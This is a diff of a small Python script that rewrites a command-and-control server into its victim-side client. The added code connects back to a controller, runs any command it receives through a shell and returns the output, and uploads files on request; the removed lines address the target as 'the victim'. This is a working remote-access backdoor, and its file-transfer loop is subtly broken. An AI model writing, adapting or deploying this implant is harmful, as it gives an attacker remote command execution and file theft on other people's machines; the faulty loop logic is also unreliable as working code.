@@ -1,33 +1,39 @@
+import os
 import socket
-from tkinter import filedialog
+import subprocess
 
-def server():
+
+def file_size(path):
+    return os.path.getsize(path)
+
+
+def client():
     s = socket.socket()
-    s.bind(('127.0.0.1', 8965))
+    s.connect(('127.0.0.1', 8965))
 
-    s.listen(1)
-    client_socket, adress = s.accept()
-    print("Connection from: " + str(adress))
+    # message = input('-> ')
     while True:
-        command = input('Please enter a command to the victim\n')
-        client_socket.send(command.encode('utf-8'))
+        data = s.recv(1024).decode('utf-8')
+        if 'cmd' in data:
+            try:
+                data = data.replace('cmd ', '')
+                s.send(subprocess.check_output(data, shell=True))
+            except Exception:
+                s.send(f"Error with {data} command".encode('utf-8'))
 
-        if 'get file ' in command:
-            file_path = input("Please enter the path of the file")
-            data = None
-            with open(file_path, 'wb')as file:
-                while data != 'complete':
-                    client_socket.sendall('ok'.encode('utf-8'))
-                    data = client_socket.recv(1024)
-                    file.write('\n'.encode('utf-8'))
-                    file.write(data)
-
+        elif 'get file' in data:
+            data = data.replace('get file ', '')
+            with open(data, 'rb') as f:
+                while EOFError(f):
+                    if s.recv(1024).decode('utf-8') == 'ok':
+                        s.sendall(f.read(1024))
+            s.sendall('complete'.encode('utf-8'))
+            f.flush()
         else:
-            data = client_socket.recv(1024)
-            print('From victim: ' + data.decode('utf-8'))
+            s.send('The command was not found'.encode('utf-8'))
 
-    client_socket.close()
+    s.close()
 
 
 if __name__ == '__main__':
-    server()
+    client()
